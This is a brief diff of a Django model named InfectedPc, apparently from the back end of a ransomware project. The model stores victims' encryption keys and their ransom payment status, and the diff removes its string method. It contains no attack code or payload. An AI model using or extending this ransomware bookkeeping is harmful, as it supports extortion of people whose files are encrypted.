@@ -8,7 +8,3 @@ class InfectedPc(models.Model):
     encryptionKey = models.CharField(max_length=255, null=False)
     #ransom payment status
     paymentStatus = models.BooleanField(default=False)
-    
-
-    def __str__(self):
-        return "{} - {}".format(self.uniqueId, self.encryptionKey)
